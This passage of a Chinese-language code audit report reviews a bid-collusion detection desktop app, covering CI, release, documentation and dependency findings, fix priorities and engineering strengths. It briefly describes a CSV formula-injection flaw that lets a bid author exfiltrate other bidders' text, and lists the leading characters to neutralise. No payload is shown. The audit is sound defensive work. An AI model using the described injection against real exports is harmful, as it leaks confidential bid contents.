| I-deadcode（refined） | `src/components/primitives.tsx:70；src/prefs.ts:51-56` | grep 确认 Avatar(primitives.tsx:70) 全库无引用、getSemantic/setSemantic(prefs.ts:51-56) 无任何 import 调用（CompareSetup 的 setSemantic 是本地 useState），属死代码；但「多数字段被 DB 层取代、仅 autoClean 仍用」不准确——Settings.tsx:253/262 仍经 prefs-backed s 读 flagCollusion 与 industryLink，main.tsx:59 用 autoClean，共三字段在用。 | 删除 Avatar(primitives.tsx:70-100) 与 getSemantic/setSemantic(prefs.ts:51-56)；prefs.Settings 保留 flagCollusion/industryLink/autoClean，其余 DB 已接管字段(semantic/scope/threshold/ignoreTemplates)可后续单独精简。 | S |
| I-universal | `CHANGELOG.md:25` | CHANGELOG.md:25 仍写「macOS 构建改 universal（含 Intel）」、BUILD.md:47 CI 章节仍写「macOS(universal)」，与 4078315 撤回、release.yml:19-21 仅 macos-latest aarch64、CHANGELOG.md:33「Intel Mac 暂不支持」及 BUILD.md:35-36「macOS 仅 arm64」自相矛盾 | CHANGELOG.md:25 改为「macOS 构建仅 arm64（Intel 因 ort 无 x86_64-apple-darwin 预编译暂不支持）」；BUILD.md:47 把「macOS(universal)」改为「macOS(arm64)」 | S |
| I-cicache | `.github/workflows/ci.yml:11` | ci.yml 全文无 Swatinem/rust-cache 步骤，setup-node（ci.yml:14-16）未设 cache: npm，test 与 cross-check 两 job 每次都从零编译 ort/fastembed/pdfium-render/tauri 全树 | 在 checkout 后加 `Swatinem/rust-cache@v2`，并给 actions/setup-node@v4 加 `with: cache: npm`（release.yml 同理） | S |
| I-npmci | `.github/workflows/ci.yml:21` | ci.yml:21 与 release.yml:44 均 `npm install`，而 package-lock.json 已入库(102KB)；npm install 可改写 lock、不严格锁版本，CI/发布产物与本地锁不一致 | 两处 `npm install` 改为 `npm ci`（严格按 package-lock 安装，lock 不一致即失败） | S |
| I-cargocomment | `src-tauri/Cargo.toml:58` | Cargo.toml:58-61 注释称 pdfium-render/fastembed/candle/ort/OCR 为「计划中…先不引入以保证干净构建」，但 pdfium-render(:33)、fastembed(:37)、oar-ocr(:38，含 ort) 均已是正式 [dependencies]，注释误导贡献者 | 删除 Cargo.toml:58-61 整段过时注释（这些依赖早已引入，git 有历史） | S |
| I-platformtest | `.github/workflows/ci.yml:50` | cross-check job(ci.yml:32-50) 对 ubuntu/windows 仅 `cargo check --lib`(ci.yml:50)，`cargo test` 只在 test job 的 macos-latest(ci.yml:11) 执行；路径分隔/GBK 文件名/pdfium.dll/Linux 缺 libpdfium.so 回落等平台分叉逻辑无任何测试验证 | 把 cross-check 的 `cargo check --lib` 改为 `cargo test --lib`（Linux 需容忍缺 libpdfium.so 的 pdf-extract 回落用例，可对 OCR/pdfium 真机用例加 #[cfg]/ignore 门控） | M |
| I-dispatchtag | `.github/workflows/release.yml:57` | release.yml:7 允许 workflow_dispatch，:57 tagName 取 github.ref_name；手动从 main 触发时 ref_name="main"，tauri-action 会以 main 为 tagName 建 tag 与 Release 草稿，污染 tag 空间 | release.yml:57 tagName 改为仅 tag 触发生效，如 `${{ github.ref_type == 'tag' && github.ref_name \|\| format('manual-{0}', github.run_number) }}`，或给 build job 加 `if: github.ref_type == 'tag'` 禁掉手动触发发布 | S |
| I-supplychain | `.github/workflows/ci.yml:1` | .github/ 下无 dependabot.yml，两 workflow 全文无 cargo audit / npm audit / cargo-deny 步骤；而依赖树含 ureq(:39 按需下载 .tar)、tar(:40 解压)、fastembed/oar-ocr(ort 下载模型) 等网络+解包链路，产品主打离线安全却无供应链漏洞门 | 新增 .github/dependabot.yml（cargo+npm+github-actions 周更），并在 ci.yml 加 `cargo audit`(cargo-audit/rustsec) 与 `npm audit --audit-level=high` 步骤 | M |

## 修复优先级建议

**第一梯队 — 三条 CRIT（合计约 1 天，直击“结论可信”产品命脉）**
1. **C2 CSV 公式注入**（S，最快）：`esc()` 内中和 `= + - @ TAB CR` 前导字符即全覆盖，无 schema 改动。对抗方就是标书作者，一次点击可外泄同表其它投标人正文——安全面最硬。
2. **C1 扫描件提示块参与比对**（M）：提示改走文档级 warning 字段（或 Block 加 `is_notice` 标记 + chunker 短路），并删掉 `parse.rs:376` 那句错误注释。工具自证式误告，直击“宁转人工不误告”红线。
3. **C3 缓存键漏模板集**（M）：把启用模板集摘要并入 `options_hash`。默认 `ignore_templates=true` 即命中，静默产出误报/漏报。

**第二梯队 — 对齐“声称与实际”（几处 S，成本低、对公信力权重高）**
- S2 工作区默认配置接线 · S3 删两个伪开关 · S11 opener 收口失实 + I-universal CHANGELOG/BUILD universal 遗留 + I-cargocomment 过期注释。对一个以公信力为卖点的取证工具，UI 与文档说的必须就是代码做的。

**第三梯队 — 工程门禁（挡住本报告里反复出现的两类问题）**
- S16 eslint+react-hooks 入 CI · S15 IPC 契约校验（serde fixture 或 tauri-specta）· I-npmci `npm ci` + I-cicache rust-cache · S14 重写 README · I-supplychain dependabot/cargo audit。

**随手清扫（S，可与上面并行）**：S7 加 `cluster_members` 索引 · I-setrunning/I-delws/I-swallow 任务状态守卫与吞错 · I-subject/I-progress 导出口径 · I-kbd/I-border 前端交互。

## 附：值得保留的工程亮点（体检的另一半）

审计的目的是找问题，但这些是这个项目明显高于同类的地方，改动时勿破坏：

- **测试文化**：手造最小合法 OOXML 夹具让测试穿过真实 zip+quick-xml+calamine 解析器；围标判定有正向（串标语料→high/medium）与负向（独立语料→none/low）双向断言，直接护卫“宁转人工不误告”；并发导入/崩溃恢复/取消清理全有回归测试。
- **中文数字归一化**（normalize.rs）细致到位：法定大写限金额语境防“陆家嘴→6家嘴”、逐位年份“二〇二六”、复合数词“十个亿”，全部有针对性测试。
- **误报抑制价值观贯穿代码**：不可测维度权重重分配而非中性分、短文本动态阈值、模板段标记不删（可解释）、金额子集视为信息缺失而非矛盾、主体同阵营换说法不判冲突——每道闸门都写了 why。
- **日志纪律**：所有 `println!/eprintln!` 限定在 `#[cfg(test)]`；生产日志只记任务数/事件名/错误码，文件名只走前端事件不落盘——“永不记录标书正文”承诺经逐点抽查成立。
- **安全底盘**：零外部命令执行点、SQL 全参数化零注入面、生产 CSP `script-src 'self'` + `connect-src` 仅 self+ipc（webview 层强制离线）、导出扩展名白名单、updater minisign 签名校验。
- **架构分层纪律**：engine 零 Tauri 依赖可独立测试、任务状态机在 SQL 层带状态守卫防竞态覆写、DB 单事务边界全有全无、启动自愈清理崩溃残留。
- **工程协调**：版本三处 + git tag 精确同步、Cargo.lock/package-lock 均入库、MSRV 显式声明、CI clippy `-D warnings` + macOS 全量测试（选 macOS 正为 libpdfium/ONNX 可真跑）、发布走 draft 人工把关。

> 三条 CRIT 都不是能力问题，而是“提示块 / 导出转义 / 缓存键”这类横切面上的单点遗漏——修复成本都在 20 行以内，且都有明确的钉死测试可防回归。
